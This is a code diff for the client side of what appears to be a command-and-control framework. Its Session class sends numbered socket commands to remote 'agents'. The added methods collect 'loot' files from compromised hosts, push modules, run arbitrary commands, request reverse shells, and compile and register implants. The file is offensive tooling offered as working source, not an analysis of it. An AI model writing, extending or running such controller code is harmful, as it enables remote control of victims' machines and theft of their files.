@@ -55,38 +55,72 @@ class Session():
 
         print("[+] Successfully gathered agent information")
 
-    def upload_file(self, file, target):
-        self.channel.sendall("22|" + file.filename)
+    def download_loot(self, agent_id):
+        filepath = "."#misc.getSavePath()
+        cnt=0
+        data = b""
 
-    def download_loot(self, target):
-        self.channel.sendall("21|"+target)
-        num = int(self.channel.recv(10))
+        if not filepath:
+            return 1
+
+        self.channel.sendall("21|"+agent_id)
+        print("Sent request")
+        num = int(self.channel.recv(10).decode())
+        print("Got number %d " % num)
         for i in range(num):
+            print("Sending ready")
             self.channel.sendall("rd")
-            name = self.channel.recv(256)
+            print("Getting name")
+            name = self.channel.recv(256).decode()
+            print("Got name " + name)
             self.channel.sendall("ok")
-            size = int(self.channel.recv(10))
+            print("sent ok")
+            size = int(self.channel.recv(10).decode())
+            print("Got size %d" % size)
             self.channel.sendall("ok")
-            data = self.channel.recv(size)
+            print("Sent OK")
+            if(size > 8196 * cnt):
+                print("inloop")
+                data += self.channel.recv(size)
+                print("Got data")
+                cnt +=1
+                print("inc")
+                self.channel.sendall("ok")
+                print("Sent ok")
+            
 
-            file = open("loot/" + name, "wb")
+            file = open(filepath + "/" + name, "wb")
             file.write(data)
 
-        self.channel.sendall("cm")
+        self.channel.sendall("cm")    
+
+    def upload_file(self, agent_id, file):
+        self.channel.sendall("22|" + file.filename)
+    
+    def do_download(self, agent_id, path):
+        print("[ ] Doing Download...")
+        self.channel.sendall("23|%s:%s" % (agent_id, path))
+
+    def push_module(self, agent_id, filestruct):
+        print("[ ] Pushing module file to agent %s..." % agent_id)
+        self.channel.sendall("24|%s:%s" % (agent_id, filestruct.filename))
+
+    def send_command(self, agent_id, command):
+        print("[ ] Sending command to agent...")
+        self.channel.sendall("25|%s:%s" % (agent_id, command))
+
+    def req_revsh(self, agent_id, port):
+        print("[ ] Sending Reverse Shell Request...")
+        self.channel.sendall("26|%s:%s" % (agent_id, port))
 
     def compile_agent(self, ip, port):
         print("[ ] Sending compile request to server (%s:%d)..." % (ip, port))
-
+        self.channel.sendall("27|%s:%s" % (ip, port))
         fileData = ""
         misc.save_file(fileData)
 
     def register_agent(self, name, password):
         print("[ ] Registering agent with server...")
+        self.channel.sendall('28|%s:%s' % (name, password))
 
-    def do_download(self, agent_id, path):
-        print("[ ] Doing Download...")
-
-    def push_module(self, agent_id, filestruct):
-        print("[ ] Pushing module file to agent %s..." % agent_id)
-
-
+    
